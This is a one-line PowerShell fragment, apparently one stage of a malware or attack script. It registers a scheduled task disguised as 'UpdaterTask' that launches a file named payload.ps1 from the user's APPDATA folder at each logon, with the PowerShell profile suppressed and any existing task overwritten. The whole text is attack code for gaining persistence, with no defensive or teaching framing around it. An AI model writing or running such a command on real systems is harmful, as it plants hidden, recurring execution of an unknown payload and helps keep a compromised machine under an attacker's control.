
<# Remote fetch #> schtasks.exe /Create /TN "UpdaterTask" /TR "powershell.exe -NoP -File `"$env:APPDATA\payload.ps1`"" /SC ONLOGON /RU $env:USERNAME /F; $StageMarker = "stage-11"
